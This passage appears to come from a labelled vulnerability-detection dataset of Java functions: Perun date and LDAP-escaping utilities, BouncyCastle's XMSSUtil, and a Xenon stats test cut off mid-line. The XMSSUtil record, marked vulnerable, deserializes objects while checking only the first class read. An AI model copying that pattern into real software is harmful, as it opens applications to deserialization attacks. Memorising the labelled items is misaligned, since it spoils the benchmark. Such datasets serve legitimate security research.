||\n\t\t\t\tattribute.getType().equals(BeansUtils.largeStringClassName) ||\n\t\t\t\tattribute.getType().equals(BeansUtils.largeArrayListClassName));\n\t}\n\n\t/**\n\t * Extends given date by given period.\n\t *\n\t * @param localDate date to be extended\n\t * @param period period used to extend date\n\t * @throws InternalErrorException when the period has wrong format,\n\t * allowed format is given by regex \"\\\\+([0-9]+)([dmy]?)\"\n\t */\n\tpublic static LocalDate extendDateByPeriod(LocalDate localDate, String period) throws InternalErrorException {\n\t\t// We will add days/months/years\n\t\tPattern p = Pattern.compile(\"\\\\+([0-9]+)([dmy]?)\");\n\t\tMatcher m = p.matcher(period);\n\t\tif (m.matches()) {\n\t\t\tString countString = m.group(1);\n\t\t\tint amount = Integer.valueOf(countString);\n\n\t\t\tString dmyString = m.group(2);\n\t\t\tswitch (dmyString) {\n\t\t\t\tcase \"d\":\n\t\t\t\t\treturn localDate.plusDays(amount);\n\t\t\t\tcase \"m\":\n\t\t\t\t\treturn localDate.plusMonths(amount);\n\t\t\t\tcase \"y\":\n\t\t\t\t\treturn localDate.plusYears(amount);\n\t\t\t\tdefault:\n\t\t\t\t\tthrow new InternalErrorException(\"Wrong format of period. Period: \" + period);\n\t\t\t}\n\t\t} else {\n\t\t\tthrow new InternalErrorException(\"Wrong format of period. Period: \" + period);\n\t\t}\n\t}\n\n\t/**\n\t * Returns closest future LocalDate based on values given by matcher.\n\t * If returned value should fall to 29. 2. of non-leap year, the date is extended to 28. 2. instead.\n\t *\n\t * @param matcher matcher with day and month values\n\t * @return Extended date.\n\t */\n\tpublic static LocalDate getClosestExpirationFromStaticDate(Matcher matcher) {\n\t\tint day = Integer.parseInt(matcher.group(1));\n\t\tint month = Integer.parseInt(matcher.group(2));\n\n\t\t// We must detect if the extension date is in current year or in a next year (we use year 2000 in comparison because it is a leap year)\n\t\tLocalDate extensionDate = LocalDate.of(2000, month, day);\n\n\t\t// check if extension is next year\n\t\t// in case of static date being today's date, we want to extend to next year (that's why we use the negation later)\n\t\tboolean extensionInThisYear = LocalDate.of(2000, LocalDate.now().getMonth(), LocalDate.now().getDayOfMonth()).isBefore(extensionDate);\n\n\t\t// Get current year\n\t\tint year = LocalDate.now().getYear();\n\t\tif (!extensionInThisYear) {\n\t\t\t// Add year to get next year\n\t\t\tyear++;\n\t\t}\n\n\t\t// Set the date to which the membership should be extended, can be changed if there was grace period, see next part of the code\n\t\tif (day == 29 && month == 2 && !LocalDate.of(year, 1,1).isLeapYear()) {\n\t\t\t// If extended date is 29. 2. of non-leap year, the date is set to 28. 2.\n\t\t\textensionDate = LocalDate.of(year, 2, 28);\n\t\t} else {\n\t\t\textensionDate = LocalDate.of(year, month, day);\n\t\t}\n\n\t\treturn extensionDate;\n\t}\n\n\t/**\n\t * Prepares grace period date by values from given matcher.\n\t * @param matcher matcher\n\t * @return pair of field(ChronoUnit.YEARS, ChronoUnit.MONTHS, ChronoUnit.DAYS) and amount\n\t * @throws InternalErrorException when given matcher contains invalid data\n\t * @throws IllegalArgumentException when matcher does not match gracePeriod format\n\t */\n\tpublic static Pair<Integer, TemporalUnit> prepareGracePeriodDate(Matcher matcher) throws InternalErrorException {\n\t\tif (!matcher.matches()) {\n\t\t\tthrow new IllegalArgumentException(\"Wrong format of gracePeriod.\");\n\t\t}\n\t\tString countString = matcher.group(1);\n\t\tint amount = Integer.valueOf(countString);\n\n\t\tTemporalUnit field;\n\t\tString dmyString = matcher.group(2);\n\t\tswitch (dmyString) {\n\t\t\tcase \"d\":\n\t\t\t\tfield = ChronoUnit.DAYS;\n\t\t\t\tbreak;\n\t\t\tcase \"m\":\n\t\t\t\tfield = ChronoUnit.MONTHS;\n\t\t\t\tbreak;\n\t\t\tcase \"y\":\n\t\t\t\tfield = ChronoUnit.YEARS;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tthrow new InternalErrorException(\"Wrong format of gracePeriod.\");\n\t\t}\n\n\t\treturn new Pair<>(amount, field);\n\t}\n\n\t/**\n\t * We need to escape some special characters for LDAP filtering.\n\t * We need to escape these characters: '\\\\', '*', '(', ')', '\\000'\n\t *\n\t * @param searchString search string which need to be escaped properly\n\t * @return properly escaped search string\n\t */\n\tpublic static String escapeStringForLDAP(String searchString) {\n\t\tif(searchString == null) return \"\";\n\t\treturn searchString.replace(\"\\\\\", \"\\\\5C\").replace(\"*\", \"\\\\2A\").replace(\"(\", \"\\\\28\").replace(\")\", \"\\\\29\").replace(\"\\000\", \"\\\\00\");\n\t}\n}\n", "target": 0}
{"idx": 1099, "func": "package org.bouncycastle.pqc.crypto.xmss;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InvalidClassException;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.ObjectStreamClass;\n\nimport org.bouncycastle.crypto.Digest;\nimport org.bouncycastle.util.Arrays;\nimport org.bouncycastle.util.encoders.Hex;\n\n/**\n * Utils for XMSS implementation.\n */\npublic class XMSSUtil\n{\n\n    /**\n     * Calculates the logarithm base 2 for a given Integer.\n     *\n     * @param n Number.\n     * @return Logarithm to base 2 of {@code n}.\n     */\n    public static int log2(int n)\n    {\n        int log = 0;\n        while ((n >>= 1) != 0)\n        {\n            log++;\n        }\n        return log;\n    }\n\n    /**\n     * Convert int/long to n-byte array.\n     *\n     * @param value      int/long value.\n     * @param sizeInByte Size of byte array in byte.\n     * @return int/long as big-endian byte array of size {@code sizeInByte}.\n     */\n    public static byte[] toBytesBigEndian(long value, int sizeInByte)\n    {\n        byte[] out = new byte[sizeInByte];\n        for (int i = (sizeInByte - 1); i >= 0; i--)\n        {\n            out[i] = (byte)value;\n            value >>>= 8;\n        }\n        return out;\n    }\n\n    /*\n     * Copy long to byte array in big-endian at specific offset.\n     */\n    public static void longToBigEndian(long value, byte[] in, int offset)\n    {\n        if (in == null)\n        {\n            throw new NullPointerException(\"in == null\");\n        }\n        if ((in.length - offset) < 8)\n        {\n            throw new IllegalArgumentException(\"not enough space in array\");\n        }\n        in[offset] = (byte)((value >> 56) & 0xff);\n        in[offset + 1] = (byte)((value >> 48) & 0xff);\n        in[offset + 2] = (byte)((value >> 40) & 0xff);\n        in[offset + 3] = (byte)((value >> 32) & 0xff);\n        in[offset + 4] = (byte)((value >> 24) & 0xff);\n        in[offset + 5] = (byte)((value >> 16) & 0xff);\n        in[offset + 6] = (byte)((value >> 8) & 0xff);\n        in[offset + 7] = (byte)((value) & 0xff);\n    }\n\n    /*\n     * Generic convert from big endian byte array to long.\n     */\n    public static long bytesToXBigEndian(byte[] in, int offset, int size)\n    {\n        if (in == null)\n        {\n            throw new NullPointerException(\"in == null\");\n        }\n        long res = 0;\n        for (int i = offset; i < (offset + size); i++)\n        {\n            res = (res << 8) | (in[i] & 0xff);\n        }\n        return res;\n    }\n\n    /**\n     * Clone a byte array.\n     *\n     * @param in byte array.\n     * @return Copy of byte array.\n     */\n    public static byte[] cloneArray(byte[] in)\n    {\n        if (in == null)\n        {\n            throw new NullPointerException(\"in == null\");\n        }\n        byte[] out = new byte[in.length];\n        for (int i = 0; i < in.length; i++)\n        {\n            out[i] = in[i];\n        }\n        return out;\n    }\n\n    /**\n     * Clone a 2d byte array.\n     *\n     * @param in 2d byte array.\n     * @return Copy of 2d byte array.\n     */\n    public static byte[][] cloneArray(byte[][] in)\n    {\n        if (hasNullPointer(in))\n        {\n            throw new NullPointerException(\"in has null pointers\");\n        }\n        byte[][] out = new byte[in.length][];\n        for (int i = 0; i < in.length; i++)\n        {\n            out[i] = new byte[in[i].length];\n            for (int j = 0; j < in[i].length; j++)\n            {\n                out[i][j] = in[i][j];\n            }\n        }\n        return out;\n    }\n\n    /**\n     * Compares two 2d-byte arrays.\n     *\n     * @param a 2d-byte array 1.\n     * @param b 2d-byte array 2.\n     * @return true if all values in 2d-byte array are equal false else.\n     */\n    public static boolean areEqual(byte[][] a, byte[][] b)\n    {\n        if (hasNullPointer(a) || hasNullPointer(b))\n        {\n            throw new NullPointerException(\"a or b == null\");\n        }\n        for (int i = 0; i < a.length; i++)\n        {\n            if (!Arrays.areEqual(a[i], b[i]))\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    /**\n     * Dump content of 2d byte array.\n     *\n     * @param x byte array.\n     */\n    public static void dumpByteArray(byte[][] x)\n    {\n        if (hasNullPointer(x))\n        {\n            throw new NullPointerException(\"x has null pointers\");\n        }\n        for (int i = 0; i < x.length; i++)\n        {\n            System.out.println(Hex.toHexString(x[i]));\n        }\n    }\n\n    /**\n     * Checks whether 2d byte array has null pointers.\n     *\n     * @param in 2d byte array.\n     * @return true if at least one null pointer is found false else.\n     */\n    public static boolean hasNullPointer(byte[][] in)\n    {\n        if (in == null)\n        {\n            return true;\n        }\n        for (int i = 0; i < in.length; i++)\n        {\n            if (in[i] == null)\n            {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    /**\n     * Copy src byte array to dst byte array at offset.\n     *\n     * @param dst    Destination.\n     * @param src    Source.\n     * @param offset Destination offset.\n     */\n    public static void copyBytesAtOffset(byte[] dst, byte[] src, int offset)\n    {\n        if (dst == null)\n        {\n            throw new NullPointerException(\"dst == null\");\n        }\n        if (src == null)\n        {\n            throw new NullPointerException(\"src == null\");\n        }\n        if (offset < 0)\n        {\n            throw new IllegalArgumentException(\"offset hast to be >= 0\");\n        }\n        if ((src.length + offset) > dst.length)\n        {\n            throw new IllegalArgumentException(\"src length + offset must not be greater than size of destination\");\n        }\n        for (int i = 0; i < src.length; i++)\n        {\n            dst[offset + i] = src[i];\n        }\n    }\n\n    /**\n     * Copy length bytes at position offset from src.\n     *\n     * @param src    Source byte array.\n     * @param offset Offset in source byte array.\n     * @param length Length of bytes to copy.\n     * @return New byte array.\n     */\n    public static byte[] extractBytesAtOffset(byte[] src, int offset, int length)\n    {\n        if (src == null)\n        {\n            throw new NullPointerException(\"src == null\");\n        }\n        if (offset < 0)\n        {\n            throw new IllegalArgumentException(\"offset hast to be >= 0\");\n        }\n        if (length < 0)\n        {\n            throw new IllegalArgumentException(\"length hast to be >= 0\");\n        }\n        if ((offset + length) > src.length)\n        {\n            throw new IllegalArgumentException(\"offset + length must not be greater then size of source array\");\n        }\n        byte[] out = new byte[length];\n        for (int i = 0; i < out.length; i++)\n        {\n            out[i] = src[offset + i];\n        }\n        return out;\n    }\n\n    /**\n     * Check whether an index is valid or not.\n     *\n     * @param height Height of binary tree.\n     * @param index  Index to validate.\n     * @return true if index is valid false else.\n     */\n    public static boolean isIndexValid(int height, long index)\n    {\n        if (index < 0)\n        {\n            throw new IllegalStateException(\"index must not be negative\");\n        }\n        return index < (1L << height);\n    }\n\n    /**\n     * Determine digest size of digest.\n     *\n     * @param digest Digest.\n     * @return Digest size.\n     */\n    public static int getDigestSize(Digest digest)\n    {\n        if (digest == null)\n        {\n            throw new NullPointerException(\"digest == null\");\n        }\n        String algorithmName = digest.getAlgorithmName();\n        if (algorithmName.equals(\"SHAKE128\"))\n        {\n            return 32;\n        }\n        if (algorithmName.equals(\"SHAKE256\"))\n        {\n            return 64;\n        }\n        return digest.getDigestSize();\n    }\n\n    public static long getTreeIndex(long index, int xmssTreeHeight)\n    {\n        return index >> xmssTreeHeight;\n    }\n\n    public static int getLeafIndex(long index, int xmssTreeHeight)\n    {\n        return (int)(index & ((1L << xmssTreeHeight) - 1L));\n    }\n\n    public static byte[] serialize(Object obj)\n        throws IOException\n    {\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(out);\n        oos.writeObject(obj);\n        oos.flush();\n        return out.toByteArray();\n    }\n\n    public static Object deserialize(byte[] data, final Class clazz)\n        throws IOException, ClassNotFoundException\n    {\n        ByteArrayInputStream in = new ByteArrayInputStream(data);\n        ObjectInputStream is = new CheckingStream(clazz, in);\n\n        Object obj = is.readObject();\n\n        if (is.available() != 0)\n        {\n            throw new IOException(\"unexpected data found at end of ObjectInputStream\");\n        }\n        // you'd hope this would always succeed!\n        if (clazz.isInstance(obj))\n        {\n            return obj;\n        }\n        else\n        {\n            throw new IOException(\"unexpected class found in ObjectInputStream\");\n        }\n    }\n\n    public static int calculateTau(int index, int height)\n    {\n        int tau = 0;\n        for (int i = 0; i < height; i++)\n        {\n            if (((index >> i) & 1) == 0)\n            {\n                tau = i;\n                break;\n            }\n        }\n        return tau;\n    }\n\n    public static boolean isNewBDSInitNeeded(long globalIndex, int xmssHeight, int layer)\n    {\n        if (globalIndex == 0)\n        {\n            return false;\n        }\n        return (globalIndex % (long)Math.pow((1 << xmssHeight), layer + 1) == 0) ? true : false;\n    }\n\n    public static boolean isNewAuthenticationPathNeeded(long globalIndex, int xmssHeight, int layer)\n    {\n        if (globalIndex == 0)\n        {\n            return false;\n        }\n        return ((globalIndex + 1) % (long)Math.pow((1 << xmssHeight), layer) == 0) ? true : false;\n    }\n\n    private static class CheckingStream\n       extends ObjectInputStream\n    {\n        private final Class mainClass;\n        private boolean found = false;\n\n        CheckingStream(Class mainClass, InputStream in)\n            throws IOException\n        {\n            super(in);\n\n            this.mainClass = mainClass;\n        }\n\n        protected Class<?> resolveClass(ObjectStreamClass desc)\n            throws IOException,\n            ClassNotFoundException\n        {\n            if (!found)\n            {\n                if (!desc.getName().equals(mainClass.getName()))\n                {\n                    throw new InvalidClassException(\n                        \"unexpected class: \", desc.getName());\n                }\n                else\n                {\n                    found = true;\n                }\n            }\n            return super.resolveClass(desc);\n        }\n    }\n}\n", "target": 1}
{"idx": 1100, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertTrue;\n\nimport java.net.URI;\nimport java.util.ArrayList;\nimport java.util.EnumSet;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.UUID;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Consumer;\n\nimport org.junit.Before;\nimport org.junit.Test;\n\nimport com.vmware.xenon.common.Service.ServiceOption;\nimport com.vmware.xenon.common.ServiceStats.ServiceStat;\nimport com.vmware.xenon.common.ServiceStats.ServiceStatLogHistogram;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats.AggregationType;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats.TimeBin;\nimport com.vmware.xenon.common.test.TestContext;\nimport com.vmware.xenon.services.common.ExampleService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleServiceState;\nimport com.vmware.xenon.services.common.MinimalTestService;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\n\npublic class TestUtilityService extends BasicReusableHostTestCase {\n\n    @Before\n    public void setUp() {\n        // We tell the verification host that we re-use it across test methods. This enforces\n        // the use of TestContext, to isolate test methods from each other.\n        // In this test class we host.testCreate(count) to get an isolated test context and\n        // then either wait on the context itself, or ask the convenience method host.testWait(ctx)\n        // to do it for us.\n        this.host.setSingleton(true);\n    }\n\n    @Test\n    public void patchConfiguration() throws Throwable {\n        int count = 10;\n\n        host.waitForServiceAvailable(ExampleService.FACTORY_LINK);\n        // try config patch on a factory\n        ServiceConfigUpdateRequest updateBody = ServiceConfigUpdateRequest.create();\n        updateBody.removeOptions = EnumSet.of(ServiceOption.IDEMPOTENT_POST);\n        TestContext ctx = this.testCreate(1);\n\n        URI configUri = UriUtils.buildConfigUri(host, ExampleService.FACTORY_LINK);\n        this.host.send(Operation.createPatch(configUri).setBody(updateBody)\n                .setCompletion(ctx.getCompletion()));\n\n        this.testWait(ctx);\n\n        TestContext ctx2 = this.testCreate(1);\n        // verify option removed\n        this.host.send(Operation.createGet(configUri).setCompletion((o, e) -> {\n            if (e != null) {\n                ctx2.failIteration(e);\n                return;\n            }\n\n            ServiceConfiguration cfg = o.getBody(ServiceConfiguration.class);\n            if (!cfg.options.contains(ServiceOption.IDEMPOTENT_POST)) {\n                ctx2.completeIteration();\n            } else {\n                ctx2.failIteration(new IllegalStateException(Utils.toJsonHtml(cfg)));\n            }\n\n        }));\n\n        this.testWait(ctx2);\n\n        List<URI> services = this.host.createExampleServices(this.host, count, null);\n\n        updateBody = ServiceConfigUpdateRequest.create();\n        updateBody.addOptions = EnumSet.of(ServiceOption.PERIODIC_MAINTENANCE);\n        updateBody.peerNodeSelectorPath = ServiceUriPaths.DEFAULT_1X_NODE_SELECTOR;\n        ctx = this.testCreate(services.size());\n        for (URI u : services) {\n            configUri = UriUtils.buildConfigUri(u);\n            this.host.send(Operation.createPatch(configUri).setBody(updateBody)\n                    .setCompletion(ctx.getCompletion()));\n        }\n        this.testWait(ctx);\n\n        // get configuration and verify options\n        TestContext ctx3 = testCreate(services.size());\n        for (URI serviceUri : services) {\n            URI u = UriUtils.buildConfigUri(serviceUri);\n            host.send(Operation.createGet(u).setCompletion((o, e) -> {\n                if (e != null) {\n                    ctx3.failIteration(e);\n                    return;\n                }\n                ServiceConfiguration cfg = o.getBody(ServiceConfiguration.class);\n                if (!cfg.options.contains(ServiceOption.PERIODIC_MAINTENANCE)) {\n                    ctx3.failIteration(new IllegalStateException(Utils.toJsonHtml(cfg)));\n                    return;\n                }\n\n                if (!ServiceUriPaths.DEFAULT_1X_NODE_SELECTOR.equals(cfg.peerNodeSelectorPath)) {\n                    ctx3.failIteration(new IllegalStateException(Utils.toJsonHtml(cfg)));\n                    return;\n                }\n                ctx3.completeIteration();\n            }));\n        }\n        testWait(ctx3);\n\n        // since we enabled periodic maintenance, verify the new maintenance related stat is present\n        this.host.waitFor(\"maintenance stat not present\", () -> {\n            for (URI u : services) {\n                Map<String, ServiceStat> stats = this.host.getServiceStats(u);\n                ServiceStat maintStat = stats.get(Service.STAT_NAME_MAINTENANCE_COUNT);\n                if (maintStat == null) {\n                    return false;\n                }\n                if (maintStat.latestValue == 0) {\n                    return false;\n                }\n            }\n            return true;\n        });\n\n    }\n\n    @Test\n    public void redirectToUiServiceIndex() throws Throwable {\n        // create an example child service and also verify it has a default UI html page\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = UUID.randomUUID().toString();\n        s.documentSelfLink = s.name;\n        Operation post = Operation\n                .createPost(UriUtils.buildFactoryUri(this.host, ExampleService.class))\n                .setBody(s);\n        this.host.sendAndWaitExpectSuccess(post);\n\n        // do a get on examples/ui and examples/<uuid>/ui, twice to test the code path that caches\n        // the resource file lookup\n        for (int i = 0; i < 2; i++) {\n            Operation htmlResponse = this.host.sendUIHttpRequest(\n                    UriUtils.buildUri(\n                            this.host,\n                            UriUtils.buildUriPath(ExampleService.FACTORY_LINK,\n                                    ServiceHost.SERVICE_URI_SUFFIX_UI))\n                            .toString(), null, 1);\n\n            validateServiceUiHtmlResponse(htmlResponse);\n\n            htmlResponse = this.host.sendUIHttpRequest(\n                    UriUtils.buildUri(\n                            this.host,\n                            UriUtils.buildUriPath(ExampleService.FACTORY_LINK, s.name,\n                                    ServiceHost.SERVICE_URI_SUFFIX_UI))\n                            .toString(), null, 1);\n\n            validateServiceUiHtmlResponse(htmlResponse);\n        }\n    }\n\n    @Test\n    public void statRESTActions() throws Throwable {\n        String name = UUID.randomUUID().toString();\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = name;\n        Consumer<Operation> bodySetter = (o) -> {\n            o.setBody(s);\n        };\n        URI factoryURI = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n        long c = 2;\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null, c,\n                ExampleServiceState.class, bodySetter, factoryURI);\n        ExampleServiceState exampleServiceState = states.values().iterator().next();\n        // Step 2 - POST a stat to the service instance and verify we can fetch the stat just posted\n        ServiceStats.ServiceStat stat = new ServiceStat();\n        stat.name = \"key1\";\n        stat.latestValue = 100;\n        stat.unit = \"unit\";\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        ServiceStats allStats = this.host.getServiceState(null, ServiceStats.class,\n                UriUtils.buildStatsUri(\n                        this.host, exampleServiceState.documentSelfLink));\n        ServiceStat retStatEntry = allStats.entries.get(\"key1\");\n        assertTrue(retStatEntry.accumulatedValue == 100);\n        assertTrue(retStatEntry.latestValue == 100);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.unit.equals(\"unit\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == null);\n\n        // Step 3 - POST a stat with the same key again and verify that the\n        // version and accumulated value are updated\n        stat.latestValue = 50;\n        stat.unit = \"unit1\";\n        Long updatedMicrosUtc1 = Utils.getNowMicrosUtc();\n        stat.sourceTimeMicrosUtc = updatedMicrosUtc1;\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        allStats = getStats(exampleServiceState);\n        retStatEntry = allStats.entries.get(\"key1\");\n        assertTrue(retStatEntry.accumulatedValue == 150);\n        assertTrue(retStatEntry.latestValue == 50);\n        assertTrue(retStatEntry.version == 2);\n        assertTrue(retStatEntry.unit.equals(\"unit1\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == updatedMicrosUtc1);\n\n        // Step 4 - POST a stat with a new key and verify that the\n        // previously posted stat is not updated\n        stat.name = \"key2\";\n        stat.latestValue = 50;\n        stat.unit = \"unit2\";\n        Long updatedMicrosUtc2 = Utils.getNowMicrosUtc();\n        stat.sourceTimeMicrosUtc = updatedMicrosUtc2;\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        allStats = getStats(exampleServiceState);\n        retStatEntry = allStats.entries.get(\"key1\");\n        assertTrue(retStatEntry.accumulatedValue == 150);\n        assertTrue(retStatEntry.latestValue == 50);\n        assertTrue(retStatEntry.version == 2);\n        assertTrue(retStatEntry.unit.equals(\"unit1\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == updatedMicrosUtc1);\n\n        retStatEntry = allStats.entries.get(\"key2\");\n        assertTrue(retStatEntry.accumulatedValue == 50);\n        assertTrue(retStatEntry.latestValue == 50);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.unit.equals(\"unit2\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == updatedMicrosUtc2);\n\n        // Step 5 - Issue a PUT for the first stat key and verify that the doc state is replaced\n        stat.name = \"key1\";\n        stat.latestValue = 75;\n        stat.unit = \"replaceUnit\";\n        stat.sourceTimeMicrosUtc = null;\n        this.host.sendAndWaitExpectSuccess(Operation.createPut(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        allStats = getStats(exampleServiceState);\n        retStatEntry = allStats.entries.get(\"key1\");\n        assertTrue(retStatEntry.accumulatedValue == 75);\n        assertTrue(retStatEntry.latestValue == 75);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.unit.equals(\"replaceUnit\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == null);\n\n        // Step 6 - Issue a bulk PUT and verify that the complete set of stats is updated\n        ServiceStats stats = new ServiceStats();\n        stat.name = \"key3\";\n        stat.latestValue = 200;\n        stat.unit = \"unit3\";\n        stats.entries.put(\"key3\", stat);\n        this.host.sendAndWaitExpectSuccess(Operation.createPut(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stats));\n        allStats = getStats(exampleServiceState);\n        if (allStats.entries.size() != 1) {\n            // there is a possibility of node group maintenance kicking in and adding a stat\n            ServiceStat nodeGroupStat = allStats.entries.get(\n                    Service.STAT_NAME_NODE_GROUP_CHANGE_MAINTENANCE_COUNT);\n\n            if (nodeGroupStat == null) {\n                throw new IllegalStateException(\n                        \"Expected single stat, got: \" + Utils.toJsonHtml(allStats));\n            }\n        }\n        retStatEntry = allStats.entries.get(\"key3\");\n        assertTrue(retStatEntry.accumulatedValue == 200);\n        assertTrue(retStatEntry.latestValue == 200);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.unit.equals(\"unit3\"));\n\n        // Step 7 - Issue a PATCH and verify that the latestValue is updated\n        stat.latestValue = 25;\n        this.host.sendAndWaitExpectSuccess(Operation.createPatch(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        allStats = getStats(exampleServiceState);\n        retStatEntry = allStats.entries.get(\"key3\");\n        assertTrue(retStatEntry.latestValue == 225);\n        assertTrue(retStatEntry.version == 2);\n\n        verifyGetWithODataOnStats(exampleServiceState);\n\n        verifyStatCreationAttemptAfterGet();\n\n    }\n\n    private void verifyGetWithODataOnStats(ExampleServiceState exampleServiceState) {\n        URI exampleStatsUri = UriUtils.buildStatsUri(this.host,\n                exampleServiceState.documentSelfLink);\n        // bulk PUT to set stats to a known state\n        ServiceStats stats = new ServiceStats();\n        stats.kind = ServiceStats.KIND;\n        ServiceStat stat = new ServiceStat();\n        stat.name = \"key1\";\n        stat.latestValue = 100;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"key2\";\n        stat.latestValue = 0.0;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"key3\";\n        stat.latestValue = -200;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"someKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY;\n        stat.latestValue = 1000;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"someOtherKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY;\n        stat.latestValue = 2000;\n        stats.entries.put(stat.name, stat);\n        this.host.sendAndWaitExpectSuccess(Operation.createPut(exampleStatsUri).setBody(stats));\n\n        // negative tests\n        URI exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_COUNT, Boolean.TRUE.toString());\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_ORDER_BY, \"name\");\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_SKIP_TO, \"100\");\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_TOP, \"100\");\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        // attempt long value LE on latestVersion, should fail\n        String odataFilterValue = String.format(\"%s le %d\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                1001);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        // Positive filter tests\n        String statName = \"key1\";\n        // test filter for exact match\n        odataFilterValue = String.format(\"%s eq %s\",\n                ServiceStat.FIELD_NAME_NAME,\n                statName);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        ServiceStats filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 1);\n        assertTrue(filteredStats.entries.containsKey(statName));\n\n        // test filter with prefix match\n        odataFilterValue = String.format(\"%s eq %s*\",\n                ServiceStat.FIELD_NAME_NAME,\n                \"key\");\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        // three entries start with \"key\"\n        assertTrue(filteredStats.entries.size() == 3);\n        assertTrue(filteredStats.entries.containsKey(\"key1\"));\n        assertTrue(filteredStats.entries.containsKey(\"key2\"));\n        assertTrue(filteredStats.entries.containsKey(\"key3\"));\n\n        // test filter with suffix match, common for time series filtering\n        odataFilterValue = String.format(\"%s eq *%s\",\n                ServiceStat.FIELD_NAME_NAME,\n                ServiceStats.STAT_NAME_SUFFIX_PER_DAY);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        // two entries end with \"Day\"\n        assertTrue(filteredStats.entries.size() == 2);\n        assertTrue(filteredStats.entries\n                .containsKey(\"someKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY));\n        assertTrue(filteredStats.entries\n                .containsKey(\"someOtherKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY));\n\n        // filter on latestValue, GE\n        odataFilterValue = String.format(\"%s ge %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                0.0);\n        exampleStatsUriWithODATA = 